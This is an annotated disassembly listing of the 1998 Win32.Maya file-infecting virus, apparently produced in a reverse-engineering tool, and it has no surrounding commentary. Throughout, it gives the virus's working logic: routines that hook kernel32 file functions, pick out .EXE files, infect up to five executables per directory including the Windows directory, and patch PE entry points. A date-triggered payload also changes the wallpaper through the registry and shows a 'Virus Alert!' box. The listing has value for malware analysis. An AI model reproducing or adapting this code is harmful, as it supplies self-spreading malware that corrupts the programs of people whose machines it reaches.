CODE:00401509 ; =============== S U B R O U T I N E =======================================
CODE:00401509
CODE:00401509
CODE:00401509 ; UINT __stdcall GetWindowsDirectoryA_0(LPSTR lpBuffer, UINT uSize)
CODE:00401509 GetWindowsDirectoryA_0 proc near        ; CODE XREF: InfectCurWindows+38↓p
CODE:00401509
CODE:00401509 lpBuffer        = dword ptr  4
CODE:00401509 uSize           = dword ptr  8
CODE:00401509
CODE:00401509                 push    ebp
CODE:0040150A                 push    80h
CODE:0040150F                 push    eax
CODE:00401510                 mov     eax, ss:GetWindowsDirectoryA[ebp]
CODE:00401516                 call    eax
CODE:00401518                 pop     ebp
CODE:00401519                 retn
CODE:00401519 GetWindowsDirectoryA_0 endp
CODE:00401519
CODE:0040151A
CODE:0040151A ; =============== S U B R O U T I N E =======================================
CODE:0040151A
CODE:0040151A
CODE:0040151A ; void __stdcall GetSystemTime_0(LPSYSTEMTIME lpSystemTime)
CODE:0040151A GetSystemTime_0 proc near               ; CODE XREF: Payload↓p
CODE:0040151A
CODE:0040151A lpSystemTime    = dword ptr  4
CODE:0040151A
CODE:0040151A                 push    ebp
CODE:0040151B                 mov     eax, offset byte_401A35
CODE:00401520                 add     eax, ebp
CODE:00401522                 push    eax
CODE:00401523                 mov     eax, ss:GetSystemTime[ebp]
CODE:00401529                 call    eax
CODE:0040152B                 pop     ebp
CODE:0040152C                 retn
CODE:0040152C GetSystemTime_0 endp
CODE:0040152C
CODE:0040152D
CODE:0040152D ; =============== S U B R O U T I N E =======================================
CODE:0040152D
CODE:0040152D
CODE:0040152D GetModuleHandleA_0_0 proc near          ; CODE XREF: Payload+1A↓p
CODE:0040152D                                         ; Payload+35↓p
CODE:0040152D                 push    ebp
CODE:0040152E                 push    eax
CODE:0040152F                 mov     eax, ss:GetModuleHandleA_0[ebp]
CODE:00401535                 call    eax
CODE:00401537                 pop     ebp
CODE:00401538                 retn
CODE:00401538 GetModuleHandleA_0_0 endp
CODE:00401538
CODE:00401539
CODE:00401539 ; =============== S U B R O U T I N E =======================================
CODE:00401539
CODE:00401539
CODE:00401539 ; FARPROC __stdcall GetProcAddress_0(HMODULE hModule, LPCSTR lpProcName)
CODE:00401539 GetProcAddress_0 proc near              ; CODE XREF: Payload+56↓p
CODE:00401539                                         ; Payload+77↓p ...
CODE:00401539
CODE:00401539 hModule         = dword ptr  4
CODE:00401539 lpProcName      = dword ptr  8
CODE:00401539
CODE:00401539                 push    ebp
CODE:0040153A                 push    edx
CODE:0040153B                 push    eax
CODE:0040153C                 mov     eax, ss:GetProcAddress[ebp]
CODE:00401542                 call    eax
CODE:00401544                 pop     ebp
CODE:00401545                 retn
CODE:00401545 GetProcAddress_0 endp
CODE:00401545
CODE:00401546
CODE:00401546 ; =============== S U B R O U T I N E =======================================
CODE:00401546
CODE:00401546
CODE:00401546 HookFileFunctions proc near             ; CODE XREF: start+8D↑p
CODE:00401546                 mov     edi, (offset aAyam+4) ; "\n"
CODE:0040154B                 add     edi, ebp
CODE:0040154D
CODE:0040154D loc_40154D:                             ; CODE XREF: HookFileFunctions+3C↓j
CODE:0040154D                 mov     ecx, [edi]
CODE:0040154F                 cmp     ecx, 'SHAI'
CODE:00401555                 jz      short locret_401584
CODE:00401557                 nop
CODE:00401558                 nop
CODE:00401559                 nop
CODE:0040155A                 nop
CODE:0040155B                 add     edi, 4
CODE:0040155E                 mov     edx, edi
CODE:00401560                 push    edi
CODE:00401561                 push    ecx
CODE:00401562                 push    ebp
CODE:00401563                 call    FindFuncInKernel32dll
CODE:00401568                 pop     ebp
CODE:00401569                 pop     ecx
CODE:0040156A                 pop     edi
CODE:0040156B                 add     edi, ecx
CODE:0040156D                 cmp     eax, 0FFFFFFFFh
CODE:00401570                 jz      short loc_40157F
CODE:00401572                 nop
CODE:00401573                 nop
CODE:00401574                 nop
CODE:00401575                 nop
CODE:00401576                 mov     [edi], eax
CODE:00401578                 mov     eax, [edi+4]
CODE:0040157B                 add     eax, ebp
CODE:0040157D                 mov     [ebx], eax
CODE:0040157F
CODE:0040157F loc_40157F:                             ; CODE XREF: HookFileFunctions+2A↑j
CODE:0040157F                 add     edi, 8
CODE:00401582                 jmp     short loc_40154D
CODE:00401584 ; ---------------------------------------------------------------------------
CODE:00401584
CODE:00401584 locret_401584:                          ; CODE XREF: HookFileFunctions+F↑j
CODE:00401584                 retn
CODE:00401584 HookFileFunctions endp
CODE:00401584
CODE:00401585
CODE:00401585 ; =============== S U B R O U T I N E =======================================
CODE:00401585
CODE:00401585
CODE:00401585 InfectExeFiles  proc near               ; CODE XREF: InfectExeFiles_1+5↓p
CODE:00401585
CODE:00401585 var_20          = dword ptr -20h
CODE:00401585
CODE:00401585                 pusha
CODE:00401586                 call    ComputeNewDeltaOffset
CODE:0040158B                 add     ecx, 28h ; '('
CODE:0040158E                 mov     edx, [esp+ecx+20h+var_20]
CODE:00401591                 call    FilterExeFiles
CODE:00401596                 cmp     eax, 1
CODE:00401599                 jnz     short loc_4015A4
CODE:0040159B                 nop
CODE:0040159C                 nop
CODE:0040159D                 nop
CODE:0040159E                 nop
CODE:0040159F                 call    InfectOneFile
CODE:004015A4
CODE:004015A4 loc_4015A4:                             ; CODE XREF: InfectExeFiles+14↑j
CODE:004015A4                 popa
CODE:004015A5                 retn
CODE:004015A5 InfectExeFiles  endp
CODE:004015A5
CODE:004015A6
CODE:004015A6 ; =============== S U B R O U T I N E =======================================
CODE:004015A6
CODE:004015A6
CODE:004015A6 FilterExeFiles  proc near               ; CODE XREF: InfectExeFiles+C↑p
CODE:004015A6                 mov     esi, edx
CODE:004015A8                 cld
CODE:004015A9
CODE:004015A9 loc_4015A9:                             ; CODE XREF: FilterExeFiles+E↓j
CODE:004015A9                 lodsb
CODE:004015AA                 cmp     al, 0
CODE:004015AC                 jz      short loc_4015D0
CODE:004015AE                 nop
CODE:004015AF                 nop
CODE:004015B0                 nop
CODE:004015B1                 nop
CODE:004015B2                 cmp     al, '.'
CODE:004015B4                 jnz     short loc_4015A9
CODE:004015B6                 cmp     dword ptr [esi-1], 'EXE.'
CODE:004015BD                 jz      short loc_4015D3
CODE:004015BF                 nop
CODE:004015C0                 nop
CODE:004015C1                 nop
CODE:004015C2                 nop
CODE:004015C3                 cmp     dword ptr [esi-1], 'exe.'
CODE:004015CA                 jz      short loc_4015D3
CODE:004015CC                 nop
CODE:004015CD                 nop
CODE:004015CE                 nop
CODE:004015CF                 nop
CODE:004015D0
CODE:004015D0 loc_4015D0:                             ; CODE XREF: FilterExeFiles+6↑j
CODE:004015D0                 xor     eax, eax
CODE:004015D2                 retn
CODE:004015D3 ; ---------------------------------------------------------------------------
CODE:004015D3
CODE:004015D3 loc_4015D3:                             ; CODE XREF: FilterExeFiles+17↑j
CODE:004015D3                                         ; FilterExeFiles+24↑j
CODE:004015D3                 mov     eax, 1
CODE:004015D8                 retn
CODE:004015D8 FilterExeFiles  endp
CODE:004015D8
CODE:004015D9
CODE:004015D9 ; =============== S U B R O U T I N E =======================================
CODE:004015D9
CODE:004015D9
CODE:004015D9 HookMoveFileA   proc near               ; DATA XREF: CODE:00401DD1↓o
CODE:004015D9                 call    InfectExeFiles_1
CODE:004015DE                 jmp     MoveFileA[ecx]
CODE:004015DE HookMoveFileA   endp
CODE:004015DE
CODE:004015E4
CODE:004015E4 ; =============== S U B R O U T I N E =======================================
CODE:004015E4
CODE:004015E4
CODE:004015E4 HookCopyFileA   proc near               ; DATA XREF: CODE:00401DE7↓o
CODE:004015E4                 call    InfectExeFiles_1
CODE:004015E9                 jmp     CopyFileA[ecx]
CODE:004015E9 HookCopyFileA   endp
CODE:004015E9
CODE:004015EF
CODE:004015EF ; =============== S U B R O U T I N E =======================================
CODE:004015EF
CODE:004015EF
CODE:004015EF HookCreateFileA_1 proc near             ; DATA XREF: CODE:00401DFF↓o
CODE:004015EF                 call    InfectExeFiles_1
CODE:004015F4                 jmp     CreateFileA_1[ecx]
CODE:004015F4 HookCreateFileA_1 endp
CODE:004015F4
CODE:004015FA
CODE:004015FA ; =============== S U B R O U T I N E =======================================
CODE:004015FA
CODE:004015FA
CODE:004015FA HookDeleteFileA proc near               ; DATA XREF: CODE:00401E17↓o
CODE:004015FA                 call    InfectExeFiles_1
CODE:004015FF                 jmp     DeleteFileA[ecx]
CODE:004015FF HookDeleteFileA endp
CODE:004015FF
CODE:00401605
CODE:00401605 ; =============== S U B R O U T I N E =======================================
CODE:00401605
CODE:00401605
CODE:00401605 HookSetFileAttributesA_1 proc near      ; DATA XREF: CODE:00401E36↓o
CODE:00401605                 call    InfectExeFiles_1
CODE:0040160A                 jmp     SetFileAttributesA_1[ecx]
CODE:0040160A HookSetFileAttributesA_1 endp
CODE:0040160A
CODE:00401610
CODE:00401610 ; =============== S U B R O U T I N E =======================================
CODE:00401610
CODE:00401610
CODE:00401610 HookGetFileAttributesA_1 proc near      ; DATA XREF: CODE:00401E55↓o
CODE:00401610                 call    InfectExeFiles_1
CODE:00401615                 jmp     GetFileAttributesA_1[ecx]
CODE:00401615 HookGetFileAttributesA_1 endp
CODE:00401615
CODE:0040161B
CODE:0040161B ; =============== S U B R O U T I N E =======================================
CODE:0040161B
CODE:0040161B
CODE:0040161B sub_40161B      proc near               ; DATA XREF: CODE:00401E72↓o
CODE:0040161B                 call    InfectExeFiles_1
CODE:00401620                 jmp     GetFullPathNameA[ecx]
CODE:00401620 sub_40161B      endp
CODE:00401620
CODE:00401626
CODE:00401626 ; =============== S U B R O U T I N E =======================================
CODE:00401626
CODE:00401626
CODE:00401626 HookCreateProcessA proc near            ; DATA XREF: CODE:00401E8D↓o
CODE:00401626                 call    InfectExeFiles_1
CODE:0040162B                 jmp     CreateProcessA[ecx]
CODE:0040162B HookCreateProcessA endp
CODE:0040162B
CODE:00401631
CODE:00401631 ; =============== S U B R O U T I N E =======================================
CODE:00401631
CODE:00401631
CODE:00401631 InfectExeFiles_1 proc near              ; CODE XREF: HookMoveFileA↑p
CODE:00401631                                         ; HookCopyFileA↑p ...
CODE:00401631                 mov     ecx, 4
CODE:00401636                 call    InfectExeFiles
CODE:0040163B                 push    ebp
CODE:0040163C                 call    ComputeNewDeltaOffset
CODE:00401641                 mov     ecx, ebp
CODE:00401643                 pop     ebp
CODE:00401644                 retn
CODE:00401644 InfectExeFiles_1 endp
CODE:00401644
CODE:00401645
CODE:00401645 ; =============== S U B R O U T I N E =======================================
CODE:00401645
CODE:00401645
CODE:00401645 ComputeNewDeltaOffset proc near         ; CODE XREF: InfectExeFiles+1↑p
CODE:00401645                                         ; InfectExeFiles_1+B↑p
CODE:00401645                 call    $+5
CODE:0040164A
CODE:0040164A loc_40164A:                             ; DATA XREF: ComputeNewDeltaOffset+6↓o
CODE:0040164A                 pop     ebp
CODE:0040164B                 sub     ebp, offset loc_40164A
CODE:00401651                 retn
CODE:00401651 ComputeNewDeltaOffset endp
CODE:00401651
CODE:00401652
CODE:00401652 ; =============== S U B R O U T I N E =======================================
CODE:00401652
CODE:00401652
CODE:00401652 InfectCurWindows proc near              ; CODE XREF: start+88↑p
CODE:00401652                 mov     ss:counter[ebp], 0
CODE:0040165C                 call    InfectFiveFiles
CODE:00401661                 cmp     ss:counter[ebp], 5
CODE:00401668                 jz      short locret_4016BE
CODE:0040166A                 nop
CODE:0040166B                 nop
CODE:0040166C                 nop
CODE:0040166D                 nop
CODE:0040166E                 mov     eax, offset byte_4019B5
CODE:00401673                 add     eax, ebp
CODE:00401675                 call    GetCurrentDirectoryA_0
CODE:0040167A                 cmp     eax, 0
CODE:0040167D                 jz      short locret_4016BE
CODE:0040167F                 nop
CODE:00401680                 nop
CODE:00401681                 nop
CODE:00401682                 nop
CODE:00401683                 mov     eax, offset windir
CODE:00401688                 add     eax, ebp
CODE:0040168A                 call    GetWindowsDirectoryA_0
CODE:0040168F                 cmp     eax, 0
CODE:00401692                 jz      short locret_4016BE
CODE:00401694                 nop
CODE:00401695                 nop
CODE:00401696                 nop
CODE:00401697                 nop
CODE:00401698                 mov     eax, offset windir
CODE:0040169D                 add     eax, ebp
CODE:0040169F                 call    SetCurrentDirectoryA_0
CODE:004016A4                 cmp     eax, 0
CODE:004016A7                 jz      short locret_4016BE
CODE:004016A9                 nop
CODE:004016AA                 nop
CODE:004016AB                 nop
CODE:004016AC                 nop
CODE:004016AD                 call    InfectFiveFiles
CODE:004016B2                 mov     eax, offset byte_4019B5
CODE:004016B7                 add     eax, ebp
CODE:004016B9                 call    SetCurrentDirectoryA_0
CODE:004016BE
CODE:004016BE locret_4016BE:                          ; CODE XREF: InfectCurWindows+16↑j
CODE:004016BE                                         ; InfectCurWindows+2B↑j ...
CODE:004016BE                 retn
CODE:004016BE InfectCurWindows endp
CODE:004016BE
CODE:004016BF
CODE:004016BF ; =============== S U B R O U T I N E =======================================
CODE:004016BF
CODE:004016BF
CODE:004016BF InfectFiveFiles proc near               ; CODE XREF: InfectCurWindows+A↑p
CODE:004016BF                                         ; InfectCurWindows+5B↑p
CODE:004016BF                 push    ebp
CODE:004016C0                 mov     eax, offset byte_401A45
CODE:004016C5                 add     eax, ebp
CODE:004016C7                 push    eax
CODE:004016C8                 mov     eax, offset aExe ; "*.EXE"
CODE:004016CD                 add     eax, ebp
CODE:004016CF                 push    eax
CODE:004016D0                 mov     eax, ss:FindFirstFileA[ebp]
CODE:004016D6                 call    eax
CODE:004016D8                 pop     ebp
CODE:004016D9                 cmp     eax, 0FFFFFFFFh
CODE:004016DC                 jz      locret_40175F
CODE:004016E2                 mov     ss:dword_401B83[ebp], eax
CODE:004016E8                 mov     edx, offset byte_401A71
CODE:004016ED                 add     edx, ebp
CODE:004016EF                 call    InfectOneFile
CODE:004016F4                 cmp     ss:flag[ebp], 1
CODE:004016FB                 jnz     short loc_401714
CODE:004016FD                 nop
CODE:004016FE                 nop
CODE:004016FF                 nop
CODE:00401700                 nop
CODE:00401701                 inc     ss:counter[ebp]
CODE:00401707                 cmp     ss:counter[ebp], 5
CODE:0040170E                 jz      short locret_40175F
CODE:00401710                 nop
CODE:00401711                 nop
CODE:00401712                 nop
CODE:00401713                 nop
CODE:00401714
CODE:00401714 loc_401714:                             ; CODE XREF: InfectFiveFiles+3C↑j
CODE:00401714                                         ; InfectFiveFiles+89↓j ...
CODE:00401714                 push    ebp
CODE:00401715                 mov     eax, offset byte_401A45
CODE:0040171A                 add     eax, ebp
CODE:0040171C                 push    eax
CODE:0040171D                 push    ss:dword_401B83[ebp]
CODE:00401723                 mov     eax, ss:FindNextFileA[ebp]
CODE:00401729                 call    eax
CODE:0040172B                 pop     ebp
CODE:0040172C                 cmp     eax, 0
CODE:0040172F                 jz      short locret_40175F
CODE:00401731                 nop
CODE:00401732                 nop
CODE:00401733                 nop
CODE:00401734                 nop
CODE:00401735                 mov     edx, offset byte_401A71
CODE:0040173A                 add     edx, ebp
CODE:0040173C                 call    InfectOneFile
CODE:00401741                 cmp     ss:flag[ebp], 1
CODE:00401748                 jnz     short loc_401714
CODE:0040174A                 inc     ss:counter[ebp]
CODE:00401750                 cmp     ss:counter[ebp], 5
CODE:00401757                 jz      short locret_40175F
CODE:00401759                 nop
CODE:0040175A                 nop
CODE:0040175B                 nop
CODE:0040175C                 nop
CODE:0040175D                 jmp     short loc_401714
CODE:0040175F ; ---------------------------------------------------------------------------
CODE:0040175F
CODE:0040175F locret_40175F:                          ; CODE XREF: InfectFiveFiles+1D↑j
CODE:0040175F                                         ; InfectFiveFiles+4F↑j ...
CODE:0040175F                 retn
CODE:0040175F InfectFiveFiles endp
CODE:0040175F
CODE:00401760
CODE:00401760 ; =============== S U B R O U T I N E =======================================
CODE:00401760
CODE:00401760
CODE:00401760 Payload         proc near               ; CODE XREF: start+92↑p
CODE:00401760                 call    GetSystemTime_0
CODE:00401765                 cmp     ss:word_401A3B[ebp], 1
CODE:0040176D                 jnz     locret_40192C
CODE:00401773                 mov     eax, offset aUser32Dll ; "USER32.dll"
CODE:00401778                 add     eax, ebp
CODE:0040177A                 call    GetModuleHandleA_0_0
CODE:0040177F                 cmp     eax, 0
CODE:00401782                 jz      locret_40192C
CODE:00401788                 mov     ss:USER32_ImageBase[ebp], eax
CODE:0040178E                 mov     eax, offset aAdvapi32Dll ; "ADVAPI32.dll"
CODE:00401793                 add     eax, ebp
CODE:00401795                 call    GetModuleHandleA_0_0
CODE:0040179A                 cmp     eax, 0
CODE:0040179D                 jz      locret_40192C
CODE:004017A3                 mov     ss:ADVAPI32_ImageBase[ebp], eax
CODE:004017A9                 mov     edx, offset aRegopenkeyexa ; "RegOpenKeyExA"
CODE:004017AE                 add     edx, ebp
CODE:004017B0                 mov     eax, ss:ADVAPI32_ImageBase[ebp]
CODE:004017B6                 call    GetProcAddress_0
CODE:004017BB                 cmp     eax, 0
CODE:004017BE                 jz      locret_40192C
CODE:004017C4                 mov     ss:RegOpenKeyExA[ebp], eax
CODE:004017CA                 mov     edx, offset aRegsetvalueexa ; "RegSetValueExA"
CODE:004017CF                 add     edx, ebp
CODE:004017D1                 mov     eax, ss:ADVAPI32_ImageBase[ebp]
CODE:004017D7                 call    GetProcAddress_0
CODE:004017DC                 cmp     eax, 0
CODE:004017DF                 jz      locret_40192C
CODE:004017E5                 mov     ss:RegSetValueExA[ebp], eax
CODE:004017EB                 mov     edx, offset aMessageboxa ; "MessageBoxA"
CODE:004017F0                 add     edx, ebp
CODE:004017F2                 mov     eax, ss:USER32_ImageBase[ebp]
CODE:004017F8                 call    GetProcAddress_0
CODE:004017FD                 cmp     eax, 0
CODE:00401800                 jz      locret_40192C
CODE:00401806                 mov     ss:MessageBoxA_0[ebp], eax
CODE:0040180C                 mov     edx, offset aSystemparamete ; "SystemParametersInfoA"
CODE:00401811                 add     edx, ebp
CODE:00401813                 mov     eax, ss:USER32_ImageBase[ebp]
CODE:00401819                 call    GetProcAddress_0
CODE:0040181E                 cmp     eax, 0
CODE:00401821                 jz      locret_40192C
CODE:00401827                 mov     ss:SystemParametersInfoA[ebp], eax
CODE:0040182D                 push    0
CODE:0040182F                 push    80h
CODE:00401834                 push    2
CODE:00401836                 push    0
CODE:00401838                 push    1
CODE:0040183A                 push    40000000h
CODE:0040183F                 mov     eax, offset aSlamBmp ; "SLAM.BMP"
CODE:00401844                 add     eax, ebp
CODE:00401846                 push    eax
CODE:00401847                 mov     eax, ss:CreateFileA[ebp]
CODE:0040184D                 call    eax
CODE:0040184F                 cmp     eax, 0FFFFFFFFh
CODE:00401852                 jz      locret_40192C
CODE:00401858                 mov     ss:dword_401ED9[ebp], eax
CODE:0040185E                 push    0
CODE:00401860                 mov     eax, offset byte_401EDD
CODE:00401865                 add     eax, ebp
CODE:00401867                 push    eax
CODE:00401868                 push    0E6h
CODE:0040186D                 mov     eax, offset dword_401F88
CODE:00401872                 add     eax, ebp
CODE:00401874                 push    eax
CODE:00401875                 push    ss:dword_401ED9[ebp]
CODE:0040187B                 mov     eax, ss:WriteFile[ebp]
CODE:00401881                 call    eax
CODE:00401883                 push    ss:dword_401ED9[ebp]
CODE:00401889                 mov     eax, ss:CloseHandle[ebp]
CODE:0040188F                 call    eax
CODE:00401891                 mov     eax, offset dword_401EAB
CODE:00401896                 add     eax, ebp
CODE:00401898                 push    eax
CODE:00401899                 push    2
CODE:0040189B                 push    0
CODE:0040189D                 mov     eax, (offset aIahscontrolPan+4) ; "Control Panel\\Desktop"
CODE:004018A2                 add     eax, ebp
CODE:004018A4                 push    eax
CODE:004018A5                 push    80000001h
CODE:004018AA                 mov     eax, ss:RegOpenKeyExA[ebp]
CODE:004018B0                 call    eax
CODE:004018B2                 push    2
CODE:004018B4                 mov     eax, offset a1  ; "1"
CODE:004018B9                 add     eax, ebp
CODE:004018BB                 push    eax
CODE:004018BC                 push    1
CODE:004018BE                 push    0
CODE:004018C0                 mov     eax, offset aTilewallpaper ; "TileWallpaper"
CODE:004018C5                 add     eax, ebp
CODE:004018C7                 push    eax
CODE:004018C8                 push    ss:dword_401EAB[ebp]
CODE:004018CE                 mov     eax, ss:RegSetValueExA[ebp]
CODE:004018D4                 call    eax
CODE:004018D6                 push    2
CODE:004018D8                 mov     eax, offset a0  ; "0"
CODE:004018DD                 add     eax, ebp
CODE:004018DF                 push    eax
CODE:004018E0                 push    1
CODE:004018E2                 push    0
CODE:004018E4                 mov     eax, offset aWallpaperstyle ; "WallpaperStyle"
CODE:004018E9                 add     eax, ebp
CODE:004018EB                 push    eax
CODE:004018EC                 push    ss:dword_401EAB[ebp]
CODE:004018F2                 mov     eax, ss:RegSetValueExA[ebp]
CODE:004018F8                 call    eax
CODE:004018FA                 push    0
CODE:004018FC                 mov     eax, offset aSlamBmp ; "SLAM.BMP"
CODE:00401901                 add     eax, ebp
CODE:00401903                 push    eax
CODE:00401904                 push    0
CODE:00401906                 push    14h
CODE:00401908                 mov     eax, ss:SystemParametersInfoA[ebp]
CODE:0040190E                 call    eax
CODE:00401910                 push    30h ; '0'
CODE:00401912                 mov     eax, offset aVirusAlert ; "Virus Alert!"
CODE:00401917                 add     eax, ebp
CODE:00401919                 push    eax
CODE:0040191A                 mov     eax, offset aWin32MayaC1998 ; "Win32.Maya (c) 1998 The Shaitan [SLAM]"
CODE:0040191F                 add     eax, ebp
CODE:00401921                 push    eax
CODE:00401922                 push    0
CODE:00401924                 mov     eax, ss:MessageBoxA_0[ebp]
CODE:0040192A                 call    eax
CODE:0040192C
CODE:0040192C locret_40192C:                          ; CODE XREF: Payload+D↑j
CODE:0040192C                                         ; Payload+22↑j ...
CODE:0040192C                 retn
CODE:0040192C Payload         endp
CODE:0040192C
CODE:0040192C ; ---------------------------------------------------------------------------
CODE:0040192D kernel32_ImageBase dd 0BFF70000h        ; DATA XREF: start+4E↑w
CODE:0040192D                                         ; FindFuncInKernel32dll_Export↑r ...
CODE:00401931 ImageBase       dd 400000h              ; DATA XREF: start+19↑w
CODE:00401931                                         ; start+9D↑r ...
CODE:00401935 windir          db 3 dup(0)             ; DATA XREF: InfectCurWindows+31↑o
CODE:00401935                                         ; InfectCurWindows+46↑o
CODE:00401938                 dd 1Fh dup(0)
CODE:004019B4                 db 0
CODE:004019B5 byte_4019B5     db 3 dup(0)             ; DATA XREF: InfectCurWindows+1C↑o
CODE:004019B5                                         ; InfectCurWindows+60↑o
CODE:004019B8                 dd 1Fh dup(0)
CODE:00401A34                 db 0
CODE:00401A35 byte_401A35     db 3 dup(0)             ; DATA XREF: GetSystemTime_0+1↑o
CODE:00401A38                 db 3 dup(0)
CODE:00401A3B word_401A3B     dw 0                    ; DATA XREF: Payload+5↑r
CODE:00401A3D                 align 10h
CODE:00401A40                 dd 0
CODE:00401A44                 db 0
CODE:00401A45 byte_401A45     db 3 dup(0)             ; DATA XREF: InfectFiveFiles+1↑o
CODE:00401A45                                         ; InfectFiveFiles+56↑o
CODE:00401A48                 dd 0Ah dup(0)
CODE:00401A70                 db 0
CODE:00401A71 byte_401A71     db 3 dup(0)             ; DATA XREF: InfectFiveFiles+29↑o
CODE:00401A71                                         ; InfectFiveFiles+76↑o
CODE:00401A74                 dd 43h dup(0)
CODE:00401B80                 db 3 dup(0)
CODE:00401B83 dword_401B83    dd 0                    ; DATA XREF: InfectFiveFiles+23↑w
CODE:00401B83                                         ; InfectFiveFiles+5E↑r
CODE:00401B87 aExe            db '*.EXE',0            ; DATA XREF: InfectFiveFiles+9↑o
CODE:00401B8D file_attributes dd 0                    ; DATA XREF: InfectOneFile+F↑w
CODE:00401B8D                                         ; InfectOneFile+224↑r
CODE:00401B91 flag            dd 0                    ; DATA XREF: InfectOneFile↑w
CODE:00401B91                                         ; InfectOneFile+1D3↑w ...
CODE:00401B95 counter         dd 0                    ; DATA XREF: start:loc_40107E↑w
CODE:00401B95                                         ; InfectCurWindows↑w ...
CODE:00401B99 AddressOfFunctions dd 0                 ; DATA XREF: FindFuncInKernel32dll_Export+3B↑w
CODE:00401B99                                         ; FindFuncInKernel32dll_Export+96↑r
CODE:00401B9D AddressOfNames  dd 0                    ; DATA XREF: FindFuncInKernel32dll_Export+4A↑w
CODE:00401B9D                                         ; FindFuncInKernel32dll_Export+64↑r
CODE:00401BA1 AddressOfNameOrdinals dd 0              ; DATA XREF: FindFuncInKernel32dll_Export+59↑w
CODE:00401BA1                                         ; FindFuncInKernel32dll_Export+88↑r
CODE:00401BA5 ImportAddressTable dd 0                 ; DATA XREF: FindFuncInKernel32dll+5F↑w
CODE:00401BA5                                         ; FindFuncInKernel32dll+B0↑r
CODE:00401BA9 dword_401BA9    dd 0                    ; DATA XREF: InfectOneFile+42↑r
CODE:00401BA9                                         ; GetFileSize_0+1↑o
CODE:00401BAD file_size       dd 0                    ; DATA XREF: InfectOneFile+50↑w
CODE:00401BAD                                         ; InfectOneFile+5C↑r ...
CODE:00401BB1 file_handler    dd 0                    ; DATA XREF: InfectOneFile+2E↑w
CODE:00401BB1                                         ; InfectOneFile+56↑r ...
CODE:00401BB5 file_mapping    dd 0                    ; DATA XREF: InfectOneFile+76↑w
CODE:00401BB5                                         ; InfectOneFile:loc_4013FA↑r
CODE:00401BB9 mapped_file     dd 0                    ; DATA XREF: InfectOneFile+96↑w
CODE:00401BB9                                         ; InfectOneFile+D7↑r ...
CODE:00401BBD pe_header       dd 0                    ; DATA XREF: InfectOneFile+EA↑w
CODE:00401BBD                                         ; InfectOneFile+127↑r ...
CODE:00401BC1 last_section    dd 0                    ; DATA XREF: InfectOneFile+12D↑w
CODE:00401BC5 FileAlignment   dd 0                    ; DATA XREF: InfectOneFile+F3↑w
CODE:00401BC5                                         ; InfectOneFile+182↑r
CODE:00401BC9 AddressOfEntryPoint dd 206Eh            ; DATA XREF: start:loc_401097↑r
CODE:00401BC9                                         ; InfectOneFile+F9↑r ...
CODE:00401BCD end_of_last_section dd 0                ; DATA XREF: InfectOneFile+147↑w
CODE:00401BCD                                         ; InfectOneFile+1B5↑r
CODE:00401BD1 old_entry_point dd 0                    ; DATA XREF: InfectOneFile+FF↑w
CODE:00401BD1                                         ; InfectOneFile+1C7↑r
CODE:00401BD5 sizeofrawdata   dd 0                    ; DATA XREF: InfectOneFile+138↑w
CODE:00401BD9 aKernel32Dll    db 'KERNEL32.dll',0     ; DATA XREF: start+43↑o
CODE:00401BE6 dword_401BE6    dd 11h                  ; DATA XREF: start+26↑r
CODE:00401BE6                                         ; start+54↑o
CODE:00401BEA aGetmodulehandl db 'GetModuleHandleA',0 ; DATA XREF: start+1F↑o
CODE:00401BFB ; HMODULE (__stdcall *GetModuleHandleA_0)(LPCSTR lpModuleName)
CODE:00401BFB GetModuleHandleA_0 dd 0                 ; DATA XREF: start+3C↑w
CODE:00401BFB                                         ; GetModuleHandleA_0_0+2↑r
CODE:00401BFF                 dd 0Fh
CODE:00401C03 aGetprocaddress db 'GetProcAddress',0
CODE:00401C12 ; FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName)
CODE:00401C12 GetProcAddress  dd 0                    ; DATA XREF: GetProcAddress_0+3↑r
CODE:00401C16                 dd 0Ch
CODE:00401C1A aCreatefilea    db 'CreateFileA',0
CODE:00401C26 ; HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
CODE:00401C26 CreateFileA     dd 0                    ; DATA XREF: CreateFileA_0+14↑r
CODE:00401C26                                         ; Payload+E7↑r
CODE:00401C2A                 dd 0Ah
CODE:00401C2E aWritefile      db 'WriteFile',0
CODE:00401C38 ; BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
CODE:00401C38 WriteFile       dd 0                    ; DATA XREF: Payload+11B↑r
CODE:00401C3C                 dd 0Ch
CODE:00401C40 aGetfilesize    db 'GetFileSize',0
CODE:00401C4C ; DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh)
CODE:00401C4C GetFileSize     dd 0                    ; DATA XREF: GetFileSize_0+A↑r
CODE:00401C50                 dd 13h
CODE:00401C54 aCreatefilemapp db 'CreateFileMappingA',0
CODE:00401C67 ; HANDLE __stdcall CreateFileMappingA(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName)
CODE:00401C67 CreateFileMappingA dd 0                 ; DATA XREF: CreateFileMappingA_0+B↑r
CODE:00401C6B                 dd 0Eh
CODE:00401C6F aMapviewoffile  db 'MapViewOfFile',0
CODE:00401C7D ; LPVOID (__stdcall *MapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap)
CODE:00401C7D MapViewOfFile   dd 0                    ; DATA XREF: MapViewOfFile_0+9↑r
CODE:00401C81                 dd 10h
CODE:00401C85 aUnmapviewoffil db 'UnmapViewOfFile',0
CODE:00401C95 ; BOOL (__stdcall *UnmapViewOfFile)(LPCVOID lpBaseAddress)
CODE:00401C95 UnmapViewOfFile dd 0                    ; DATA XREF: UnmapViewOfFile_0+2↑r
CODE:00401C99                 dd 0Ch
CODE:00401C9D aClosehandle    db 'CloseHandle',0
CODE:00401CA9 ; BOOL (__stdcall *CloseHandle)(HANDLE hObject)
CODE:00401CA9 CloseHandle     dd 0                    ; DATA XREF: CloseHandle_0+2↑r
CODE:00401CA9                                         ; Payload+129↑r
CODE:00401CAD                 dd 0Fh
CODE:00401CB1 aFindfirstfilea db 'FindFirstFileA',0
